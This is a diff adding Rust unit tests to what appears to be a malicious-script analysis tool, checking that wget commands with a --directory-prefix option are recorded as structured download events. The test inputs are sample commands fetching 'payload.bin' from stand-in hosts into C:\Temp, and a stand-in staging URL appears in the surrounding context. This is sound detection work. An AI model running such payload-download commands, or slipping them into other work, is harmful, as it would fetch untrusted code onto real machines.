@@ -8168,6 +8168,32 @@ mod wget_tests {
     }
 
     #[test]
+    fn wget_long_directory_prefix_records_destination_prefix() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget --directory-prefix C:\Temp https://wget-prefix.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-prefix.example/payload.bin",
+                Some(r#"C:\Temp"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wget_schemeless_domain_path_records_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -19468,6 +19494,27 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
         assert!(
             has,
             "schemeless certutil deob-text source was not structured: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_long_directory_prefix_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget --directory-prefix=C:\Temp https://wget-prefix-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-prefix-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from wget --directory-prefix: {:?}",
             env.traits
         );
     }
